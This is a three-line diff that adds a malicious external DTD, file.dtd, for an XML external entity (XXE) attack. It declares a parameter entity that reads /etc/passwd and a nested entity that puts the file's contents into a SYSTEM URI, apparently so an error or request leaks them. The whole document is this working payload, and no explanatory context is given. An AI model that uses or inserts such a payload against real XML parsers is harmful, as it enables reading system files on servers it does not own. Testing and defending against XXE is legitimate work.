@@ -1,0 +1,3 @@
+<!-- file.dtd -->
+<!ENTITY % d SYSTEM "file:///etc/passwd"> 
+<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
